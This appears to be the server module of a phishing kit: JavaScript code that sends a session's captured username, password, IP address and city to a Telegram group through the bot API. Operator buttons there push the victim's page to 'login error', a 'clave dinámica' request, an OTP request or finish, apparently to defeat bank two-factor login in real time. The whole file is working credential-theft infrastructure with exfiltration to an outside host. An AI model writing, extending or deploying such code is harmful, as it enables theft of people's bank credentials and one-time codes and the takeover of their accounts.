import {
  activeSessions,
  decisionMap,
  buildMessageText,
} from "../controllers/botController.js";

import { v4 as uuidv4 } from "uuid";

const pendingDecisions = new Map();

export function waitForDecision(decisionId, step = 1) {
  return new Promise((resolve, reject) => {
    if (pendingDecisions.has(decisionId)) {
      pendingDecisions.delete(decisionId);
    }
    pendingDecisions.set(decisionId, { resolve, reject, step });
  });
}

export function removePending(decisionId) {
  pendingDecisions.delete(decisionId);
}

export const sendTelegramAlert = async ({ sessionId, groupId, text }) => {
  let buttons = [];
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const telegramApi = `https://api.telegram.org/bot${token}/sendMessage`;
  const session = activeSessions.get(sessionId);
  const decisionId = session.decisionId;
  const step = session.step || 1;
  if (step === 1) {
    buttons = [
      [
        { text: "Continuar", callback_data: `continue:${decisionId}` },
        { text: "Error de Login", callback_data: `errorLogin:${decisionId}` },
      ],
    ];
  } else if (step === 2) {
    buttons = [
      [
        {
          text: "Pedir Dinámica",
          callback_data: `requestDinamica:${decisionId}`,
        },
        { text: "Pedir OTP", callback_data: `requestOtp:${decisionId}` },
        { text: "Finalizar", callback_data: `finalize:${decisionId}` },
      ],
    ];
  }
  const response = await fetch(telegramApi, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: groupId,
      text,
      reply_markup: {
        inline_keyboard: buttons,
      },
    }),
  });

  const result = await response.json();
  if (!result.ok) {
    console.error("Telegram error:", result);
    return { message_id: null };
  }

  return {
    message_id: result.result.message_id,
  };
};

export async function respondToTelegramCallback(callback) {
  const [action, decisionId] = callback.data.split(":");
  const sessionId = decisionMap.get(decisionId);
  const session = activeSessions.get(sessionId);
  if (!session) return;

  let newText = session.messageText; // Debe almacenarse en la sesión
  let newStep = session.step;
  if (session.step === 1 && action === "errorLogin") {
    session.user = "";
    session.pass = "";
    session.ip = "";
    session.city = "";
    session.step = 1;
    // Generar nuevo decisionId
    const newDecisionId = uuidv4();
    session.decisionId = newDecisionId;

    // Actualizar mensaje de Telegram
    const newText = buildMessageText(session);
    await editTelegramMessage({
      chatId: session.chatId,
      messageId: session.messageId,
      text: newText,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Continuar", callback_data: `continue:${newDecisionId}` },
            { text: "Error de Login", callback_data: `errorLogin:${newDecisionId}` },
          ],
        ],
      },
    });

    // Actualizar decisionMap y crear nueva promesa
    decisionMap.set(newDecisionId, sessionId);
    decisionMap.delete(decisionId); // Limpiar el anterior

    // Volver a esperar decisión con el nuevo decisionId
    waitForDecision(newDecisionId, session.step)
      .then((newAction) => {
        if (ioInstance) {
          ioInstance.to(session.socketId).emit("decision", newAction);
        }
      })
      .catch((err) => {
        console.error("Timeout nueva decisión:", err.message);
      });
  } else if (session.step === 1 && action === "continue") {
    // Etapa 1 → Etapa 2
    newStep = 2;
    newText = buildMessageText(session);

    // Actualiza botones a "Error Datos"
    await editTelegramMessage({
      chatId: session.chatId,
      messageId: session.messageId,
      text: newText,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Continuar", callback_data: `continue:${decisionId}` },
            { text: "Error Datos", callback_data: `errorData:${decisionId}` },
          ],
        ],
      },
    });
  } else if (
    session.step === 2 &&
    ["requestDinamica", "requestOtp"].includes(action)
  ) {
    // Etapa 2 → Etapa 3
    newStep = 3;
    newText = buildMessageText(session, step);

    // Actualiza botones a "Error Dinámica" y "Error OTP"
    await editTelegramMessage({
      chatId: session.chatId,
      messageId: session.messageId,
      text: newText,
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Error Dinámica",
              callback_data: `errorDinamica:${decisionId}`,
            },
            { text: "Error OTP", callback_data: `errorOtp:${decisionId}` },
            { text: "Finalizar", callback_data: `finalize:${decisionId}` },
          ],
        ],
      },
    });
  }

  // Resuelve la promesa y actualiza la sesión
  if (pendingDecisions.has(decisionId)) {
    pendingDecisions.get(decisionId).resolve(action);
    session.step = newStep;
    session.messageText = newText;
    pendingDecisions.delete(decisionId);
  }

  /* await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      callback_query_id: callback.id,
      text: `Has seleccionado: ${decision}`,
      show_alert: false,
    }),
  });

  if (pendingDecisions.has(decisionId)) {
    const { resolve } = pendingDecisions.get(decisionId);
    resolve(decision);
    pendingDecisions.delete(decisionId);
  } */
}

export const sendSimpleTelegramMessage = async (chatId, text) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text }),
  });

  const data = await res.json();
  return data.result;
};

export const editTelegramMessage = async ({
  chatId,
  messageId,
  text,
  reply_markup,
}) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;

  const payload = {
    chat_id: chatId,
    message_id: messageId,
    text,
    parse_mode: "HTML",
  };

  if (reply_markup) {
    payload.reply_markup = reply_markup;
  }

  const response = await fetch(
    `https://api.telegram.org/bot${token}/editMessageText`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    }
  );

  const result = await response.json();
  return result.result;
};
